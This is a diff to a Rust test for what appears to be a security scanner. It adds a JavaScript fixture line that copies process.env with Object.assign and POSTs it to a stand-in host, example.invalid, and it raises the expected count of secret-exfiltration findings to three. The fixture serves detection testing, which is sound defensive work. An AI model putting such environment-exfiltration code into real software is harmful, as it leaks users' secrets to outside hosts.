@@ -1120,6 +1120,9 @@ fn object_copy_and_entries_transforms_preserve_environment_secrets() {
         root.join("positive.js"),
         br#"const copied = Object.assign({}, process.env);
 fetch('https://example.invalid/assign', { method: 'POST', body: JSON.stringify(copied) });
+const target = {};
+Object.assign(target, process.env);
+fetch('https://example.invalid/mutate', { method: 'POST', body: JSON.stringify(target) });
 const entries = Object.fromEntries(Object.entries(process.env));
 fetch('https://example.invalid/entries', { method: 'POST', body: JSON.stringify(entries) });"#,
     )
@@ -1140,7 +1143,7 @@ fetch('https://example.invalid/metrics', { method: 'POST', body: JSON.stringify(
         .iter()
         .filter(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
         .collect::<Vec<_>>();
-    assert_eq!(exfiltration.len(), 2, "{}", report["findings"]);
+    assert_eq!(exfiltration.len(), 3, "{}", report["findings"]);
     assert!(
         exfiltration
             .iter()
